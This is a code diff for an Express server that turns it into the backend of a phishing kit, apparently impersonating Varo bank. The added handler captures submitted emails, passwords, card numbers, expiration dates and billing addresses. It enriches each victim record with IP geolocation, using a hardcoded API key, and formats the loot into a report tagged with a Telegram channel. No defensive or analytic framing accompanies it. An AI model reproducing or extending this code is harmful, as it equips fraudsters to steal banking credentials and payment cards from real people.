@@ -1,9 +1,14 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const sqlite3 = require('sqlite3').verbose();
+const axios = require('axios');
 
 const app = express();
-const port = 3000; // Define the port
+const port = process.env.PORT || 3000;
+
+// Constants for API details
+const API_URL = 'https://api-bdc.net/data/ip-geolocation?ip=';
+const API_KEY = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 
 app.use(express.static('public'));
 app.use(bodyParser.json());
@@ -15,8 +20,8 @@ db.serialize(() => {
   db.run("CREATE TABLE clients (id TEXT PRIMARY KEY, inputs TEXT, ip TEXT)");
 });
 
-const clients = {}; // Initialize the clients object
-let adminClient = null; // Initialize the admin client
+const clients = {};
+let adminClient = null;
 
 function addClientToDatabase(clientId, ip) {
   db.run("INSERT INTO clients (id, inputs, ip) VALUES (?, ?, ?)", [clientId, JSON.stringify({}), ip], (err) => {
@@ -69,10 +74,94 @@ function broadcastAdminPanel() {
   });
 }
 
+function getClientIp(req) {
+  const xForwardedFor = req.headers['x-forwarded-for'];
+  if (xForwardedFor) {
+    const ips = xForwardedFor.split(',');
+    return ips[0].trim();
+  }
+  return req.connection.remoteAddress || req.socket.remoteAddress || null;
+}
+
+const handleRequest = async (req, res) => {
+  let message = '';
+  let myObject = req.body;
+
+  const sendAPIRequest = async (ipAddress) => {
+    try {
+      const apiResponse = await axios.get(`${API_URL}${ipAddress}&localityLanguage=en&key=${API_KEY}`);
+      console.log(apiResponse.data);
+      return apiResponse.data;
+    } catch (error) {
+      console.error(`Error fetching IP information: ${error.message}`);
+      return null;
+    }
+  };
+
+  const ipAddress = getClientIp(req);
+  const ipAddressInformation = await sendAPIRequest(ipAddress);
+  if (!ipAddressInformation) {
+    return res.status(500).send('Error retrieving IP information');
+  }
+
+  const userAgent = req.headers["user-agent"];
+  const systemLang = req.headers["accept-language"];
+  const myObjects = Object.keys(myObject);
+  const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
+
+  if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
+    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
+               `👤 LOGIN \n\n`;
+
+    for (const key of myObjects) {
+      if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+    }
+
+    message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+        `CITY             : ${ipAddressInformation.location.city}\n` +
+        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+        `💻 SYSTEM INFO\n` +
+        `USER AGENT       : ${userAgent}\n` +
+        `SYSTEM LANGUAGE  : ${systemLang}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+    res.send('dn');
+    return;
+  }
+
+  if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
+    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
+               `👤 CARD INFO \n\n`;
+
+    for (const key of myObjects) {
+      if (key.toLowerCase() !== 'visitor') {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+    }
+
+    message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+        
+    return;
+  }
+};
+
 app.get('/events', (req, res) => {
   const clientId = req.query.clientId;
   const isAdmin = req.query.admin === 'true';
-  const clientIp = req.ip;
+  const clientIp = getClientIp(req);
 
   console.log(`Received /events request: clientId=${clientId}, isAdmin=${isAdmin}, ip=${clientIp}`);
 
@@ -163,9 +252,25 @@ app.post('/input', (req, res) => {
 
     updateClientInputs(clientId, updatedInputs);
     broadcastAdminPanel();
-
     res.sendStatus(200);
   });
+  
+  try {
+    await handleRequest(req, res);
+  } catch (error) {
+    console.error(`Error processing request: ${error.message}`);
+    //res.sendStatus(500);
+  }
+
+});
+
+app.post('/process-request', async (req, res) => {
+  try {
+    await handleRequest(req, res);
+  } catch (error) {
+    console.error(`Error processing request: ${error.message}`);
+    res.sendStatus(500);
+  }
 });
 
 app.listen(port, () => {
